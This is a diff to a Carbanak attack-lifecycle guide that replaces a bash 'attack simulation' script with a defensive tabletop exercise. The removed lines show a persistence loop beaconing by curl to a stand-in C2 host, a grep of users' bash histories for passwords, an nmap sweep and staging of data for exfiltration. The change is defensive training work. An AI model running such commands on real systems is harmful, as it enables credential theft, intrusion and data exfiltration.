@@ -1419,43 +1419,31 @@ Carbanak Attack Lifecycle:
 # Inject code into legitimate processes
 ```
 
-### Attack Simulation
+### Defensive Tabletop Exercise
 
-```bash
-#!/bin/bash
-# carbanak_simulation.sh - Educational attack chain simulation
+This scenario is a discussion exercise, not a runnable attack simulation. Use fictional event cards and synthetic records only. Do not create persistence, contact external hosts, inspect user histories, scan networks, collect credentials, or archive real data.
 
-echo "[*] Phase 1: Initial Compromise (Simulated)"
-# In real attack: spear-phishing with malicious document
+**Facilitator events:**
 
-echo "[*] Phase 2: Establish Persistence"
-# Create scheduled task for persistence
-cat > /tmp/persist.sh << 'EOF'
-#!/bin/bash
-while true; do
-    # Beacon to C2 server
-    curl -s http://c2-server.com/beacon
-    sleep 3600
-done
-EOF
-chmod +x /tmp/persist.sh
+1. An endpoint alert reports a suspicious office-document launch.
+2. A synthetic process event shows an unapproved scheduled-task change.
+3. A mock network event reports unusual internal discovery behavior.
+4. A simulated file-staging alert reports attempted access to a payment-system share.
 
-echo "[*] Phase 3: Credential Harvesting"
-# In real attack: use Mimikatz
-# Simulated: check for stored credentials
-grep -r "password" /home/*/.bash_history 2>/dev/null
+**Responder tasks:**
 
-echo "[*] Phase 4: Lateral Movement"
-# In real attack: PsExec, RDP
-# Simulated: scan network
-nmap -sn 192.168.1.0/24
+- Identify the owner, scope, severity, and likely impact of each event.
+- State which endpoint, identity, network, and file-access telemetry would confirm or disprove the hypothesis.
+- Choose containment and evidence-preservation steps; do not access employee data or payment systems.
+- Record recovery, credential-reset, communication, and lessons-learned decisions.
 
-echo "[*] Phase 5: Data Exfiltration"
-# In real attack: manipulate financial systems
-# Simulated: archive sensitive data
-tar -czf /tmp/exfil.tar.gz /path/to/sensitive/data 2>/dev/null
-
-echo "[!] This is a simulation for educational purposes only"
+```mermaid
+flowchart LR
+    Event[Scenario card: suspicious activity] --> Triage[Confirm scope and business impact]
+    Triage --> Preserve[Preserve synthetic evidence]
+    Preserve --> Contain[Choose containment and escalation]
+    Contain --> Recover[Plan recovery and credential review]
+    Recover --> Improve[Record detection and process gaps]
 ```
 
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
